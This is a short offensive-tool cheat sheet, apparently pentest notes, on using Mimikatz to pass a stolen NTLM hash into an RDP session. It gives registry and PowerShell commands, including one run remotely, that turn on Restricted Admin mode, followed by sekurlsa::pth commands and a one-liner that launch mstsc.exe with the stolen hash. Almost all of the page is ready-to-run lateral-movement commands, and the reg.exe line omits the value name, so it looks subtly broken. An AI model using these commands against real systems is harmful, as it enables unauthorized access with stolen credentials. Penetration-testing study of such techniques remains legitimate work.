# Mimikatz

Search Tag(s): #post-exploitation #lateral-movement #offensive-tools #windows

## 01 - Conditions

Enable restricted admin.

### 1.1 - Command Prompt

```
C:\> reg.exe add [\\<IP>\]HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /d 0 /f
```

### 1.2 - PowerShell

```
PS C:\> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force }
```

## 02 - Run RDP Remote Session 

After passing the hash. Create a new process to authenticate RDP. This is much easier to do.

```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nt_hash>

mimikatz # process::start "mstsc.exe /v:<IP> /restrictedadmin"
```

You can do this in one-liner.

```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<nt_hash> /run:"mstsc.exe /v:<IP> /restrictedadmin"
```

---
## References

- [ederml's Blog: Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)